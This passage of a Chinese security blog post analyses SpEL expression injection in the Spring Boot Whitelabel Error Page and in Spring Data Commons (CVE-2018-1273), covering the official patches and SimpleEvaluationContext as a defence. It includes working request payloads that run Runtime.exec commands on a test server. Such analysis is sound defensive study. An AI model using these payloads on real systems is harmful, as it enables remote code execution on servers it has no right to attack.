+<p>就到了我们解析表达式的地方：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.49.25-image.png" alt="2019-05-27.17.49.25-image.png"></p>
+<p>因为<code>${message}</code>内容为<code>${paylaod}</code>,所以会再次解析<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.39.57-image.png" alt="2019-05-27.20.39.57-image.png"></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.17.56.29-image.png" alt="2019-05-27.17.56.29-image.png"></p>
+<p>最后调用<code>getValue()</code>造成命令执行        </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-27.20.40.55-image.png" alt="2019-05-27.20.40.55-image.png"></p>
+<h3 id="Whitelabel-Error-Page是如何实现的"><a href="#Whitelabel-Error-Page是如何实现的" class="headerlink" title="Whitelabel Error Page是如何实现的"></a>Whitelabel Error Page是如何实现的</h3><p><strong>为什么我们的controller发生错误,而我们自己没有进行异常捕获,默认会跳转到Whitelabel Error Page页面</strong></p>
+<p><code>SpringBoot</code>内部提供了一个<code>ErrorController</code> 为<code>BasicErrorController</code>,其<code>@RequestMapping</code>默认为<code>/error</code>,当SpringBoot程序的Controller发生错误，默认去访问<code>/error</code>,请求在<code>BasicErrorController</code>处理,返回error视图,而error这个Bean在<code>ErrorMvcAutoConfiguration</code>的自动化配置类中定义,它会返回<code>SpelView</code>视图也就是刚才的<code>Whitelabel Error Page</code>页面</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">protected static class WhitelabelErrorViewConfiguration &#123;</span><br><span class="line">        private final ErrorMvcAutoConfiguration.SpelView defaultErrorView = new ErrorMvcAutoConfiguration.SpelView(&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&lt;div id=&apos;created&apos;&gt;$&#123;timestamp&#125;&lt;/div&gt;&lt;div&gt;There was an unexpected error (type=$&#123;error&#125;, status=$&#123;status&#125;).&lt;/div&gt;&lt;div&gt;$&#123;message&#125;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&quot;);</span><br><span class="line"></span><br><span class="line">        protected WhitelabelErrorViewConfiguration() &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Bean(</span><br><span class="line">            name = &#123;&quot;error&quot;&#125;</span><br><span class="line">        )</span><br><span class="line">        @ConditionalOnMissingBean(</span><br><span class="line">            name = &#123;&quot;error&quot;&#125;</span><br><span class="line">        )</span><br><span class="line">        public View defaultErrorView() &#123;</span><br><span class="line">            return this.defaultErrorView;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>我们漏洞发生的地方就是在使用SpEl表达式从当前<code>context</code>的<code>RootObject</code>中获取相关数据(<code>exception path message</code>等)填充到<code>Whitelabel Error Page</code>页面时发生的。        </p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>参考:<a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split" target="_blank" rel="noopener">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6?diff=split</a>                </p>
+<p>SpringBoot版本为1.3.5.RELEASE<br>官方给的修复方式是增加了<code>NonRecursivePropertyPlaceholderHelper</code>类,防止递归解析其中的SpEl表达式</p>
+<p>SpelView类的helper变为了<code>NonRecursivePropertyPlaceholderHelper</code>对象:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final NonRecursivePropertyPlaceholderHelper helper = new NonRecursivePropertyPlaceholderHelper(&quot;$&#123;&quot;, &quot;&#125;&quot;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="测试补丁"><a href="#测试补丁" class="headerlink" title="测试补丁"></a>测试补丁</h3><p>第一次解析<code>${messae}</code>时,类型为:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.43.38-image.png" alt="2019-05-28.21.43.38-image.png"></p>
+<p>接着会判断是否是<code>NonRecursivePlaceholderResolver</code>的实例对象,若是,则直接返回null,若不是再解析<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.45.05-image.png" alt="2019-05-28.21.45.05-image.png"></p>
+<p>所以第一次解析<code>${message}</code>时,会去解析表达式<code>expression</code>得到我们的payload,而再次解析我们传入payload时,类型变为:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-28.21.47.12-image.png" alt="2019-05-28.21.47.12-image.png"></p>
+<p>所以会直接返回null,解析失败。            </p>
+<p>注意:<br>若修改了SpringBoot的版本,Spring的版本也要跟着修改匹配,匹配表:<a href="https://www.cnblogs.com/badtree/articles/9145493.html" target="_blank" rel="noopener">https://www.cnblogs.com/badtree/articles/9145493.html</a></p>
+<h2 id="Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><a href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）" class="headerlink" title="Spring Data Commons远程代码执行漏洞（CVE-2018-1273）"></a>Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</h2><blockquote>
+<p>使用了StandardEvaluationContext作为虚拟容器,表达式可控且最后调用了其setValue()方法            </p>
+</blockquote>
+<p>漏洞环境参考:<a href="https://github.com/wearearima/poc-cve-2018-1273" target="_blank" rel="noopener">https://github.com/wearearima/poc-cve-2018-1273</a>        </p>
+<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><p>影响版本：<br>1.13-1.13.10<br>2.0-2.0.5</p>
+<h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>传入payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/account			</span><br><span class="line">name[#this.getClass().forName(&apos;java.lang.Runtime&apos;).getRuntime().exec(&apos;calc.exe&apos;)]=123</span><br><span class="line"></span><br><span class="line">name[T(java.lang.Runtime).getRuntime().exec(&apos;calc&apos;)]=123</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.22.01.46-image.png" alt="2019-05-29.22.01.46-image.png"></p>
+<p>根据分析文章,我们直接定位到<code>org.springframework.data.web.MapDataBinder.setProperty()</code>,下个断点,由函数名字可看出该方法作用时是设置成员变量值<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.49.20-image.png" alt="2019-05-29.21.49.20-image.png"></p>
+<p>propertyName是我们传入的payload,接着设置了context与expression,最后调用<code>setValue()</code>触发<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.54.03-image.png" alt="2019-05-29.21.54.03-image.png"></p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-05-29.21.55.47-image.png" alt="2019-05-29.21.55.47-image.png"></p>
+<p>弹出计算器</p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>官方修复代码:<a href="https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-commons/commit/ae1dd2741ce06d44a0966ecbd6f47beabde2b653</a>            </p>
+<p>大意为<code>StandardEvaluationContext</code>更换为<code>SimpleEvaluationContext</code>,在基础知识中我们已经讲到后者权限较小,不能执行恶意代码,只支持一些map结构,所以可以防止被攻击。        </p>
+<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><blockquote>
+<p>最简单的方法就是使用较为安全的实现类SimpleEvaluationContext去防御</p>
+</blockquote>
+<p>官方文档可参考:<br><a href="https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html" target="_blank" rel="noopener">https://docs.spring.io/spring/docs/5.0.6.RELEASE/javadoc-api/org/springframework/expression/spel/support/SimpleEvaluationContext.html</a></p>
+<p>一般使用:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User user=new User(&quot;P0rZ9&quot;);</span><br><span class="line">        ExpressionParser parser = new SpelExpressionParser();</span><br><span class="line">        Expression exp = parser.parseExpression(&quot;name&quot;);</span><br><span class="line">        EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().withRootObject(user).build();</span><br><span class="line">        exp.getValue(context);</span><br></pre></td></tr></table></figure></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
+<p>一般使用SpEl表达式的就是利用其内部使用反射这个特点,从而很方便去操作Bean 存取数据等。以后在审计时可以通过留意StandardEvaluationContext与getValue() setValue()这些关键方法。</p>
+</blockquote>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</a>        </p>
+<p><a href="https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/10183137.html#x04%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0</a>        </p>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;mid=2650173748&amp;idx=1&amp;sn=a0fa9e48ed05d80b7c693082f6b687ce&amp;scene=1&amp;srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzAwMzI0MTMwOQ==&amp;mid=2650173748&amp;idx=1&amp;sn=a0fa9e48ed05d80b7c693082f6b687ce&amp;scene=1&amp;srcid=0911LaFVNrVdYZr7nIyS8Nn3#rd</a>                </p>
+<p><a href="https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/" target="_blank" rel="noopener">https://www.kingkk.com/2019/05/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5-%E5%85%A5%E9%97%A8%E7%AF%87/</a></p>
+<p><a href="https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/" target="_blank" rel="noopener">https://laworigin.github.io/2019/04/09/Spring-messaging-SPEL-Injection/</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="../../../../index.html">Home</a></li>
+         
+          <li><a href="../../../../about.html">About</a></li>
+         
+          <li><a href="../../../../archives/">Writing</a></li>
+         
+          <li><a href="../../../../friends.html">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEl简介"><span class="toc-number">1.</span> <span class="toc-text">SpEl简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#用法"><span class="toc-number">1.1.</span> <span class="toc-text">用法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#语法实例"><span class="toc-number">1.2.</span> <span class="toc-text">语法实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#类相关表达式"><span class="toc-number">1.2.1.</span> <span class="toc-text">类相关表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#类类型表达式"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">类类型表达式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#类实例化"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">类实例化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#对象方法调用"><span class="toc-number">1.2.1.3.</span> <span class="toc-text">对象方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#变量定义及引用"><span class="toc-number">1.2.1.4.</span> <span class="toc-text">变量定义及引用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#主要接口"><span class="toc-number">1.2.2.</span> <span class="toc-text">主要接口</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SpEL导致的任意命令执行原理分析"><span class="toc-number">2.</span> <span class="toc-text">SpEL导致的任意命令执行原理分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞案例分析"><span class="toc-number">3.</span> <span class="toc-text">漏洞案例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SpringBoot-SpEL表达式注入漏洞"><span class="toc-number">3.1.</span> <span class="toc-text">SpringBoot SpEL表达式注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件"><span class="toc-number">3.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#环境搭建"><span class="toc-number">3.1.2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析"><span class="toc-number">3.1.3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Whitelabel-Error-Page是如何实现的"><span class="toc-number">3.1.4.</span> <span class="toc-text">Whitelabel Error Page是如何实现的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞修复"><span class="toc-number">3.1.5.</span> <span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#测试补丁"><span class="toc-number">3.1.6.</span> <span class="toc-text">测试补丁</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-Data-Commons远程代码执行漏洞（CVE-2018-1273）"><span class="toc-number">3.2.</span> <span class="toc-text">Spring Data Commons远程代码执行漏洞（CVE-2018-1273）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用条件-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞分析-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-number">3.2.3.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#防御"><span class="toc-number">4.</span> <span class="toc-text">防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">4.1.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#参考链接"><span class="toc-number">4.1.1.</span> <span class="toc-text">参考链接</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/05/30/SpEL表达式注入/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&text="><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&is_video=false&description="><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://yoursite.com/2019/05/30/SpEL表达式注入/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&title="><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/05/30/SpEL表达式注入/&name=&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> 目录</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> 顶部</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> 菜单</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    版权所有 &copy; 2019 P0rZ9
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <li><a href="../../../../index.html">Home</a></li><li><a href="../../../../about.html">About</a></li><li><a href="../../../../archives/">Writing</a></li><li><a href="../../../../friends.html">Friends</a></li>
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="../../../../lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="../../../../lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="../../../../lib/justified-gallery/justifiedGallery.min.css">
+
+
+<!-- jquery -->
+<script src="../../../../lib/jquery/jquery.min.js"></script>
+<script src="../../../../lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="../../../../js/main.js"></script>
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-86660611-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+
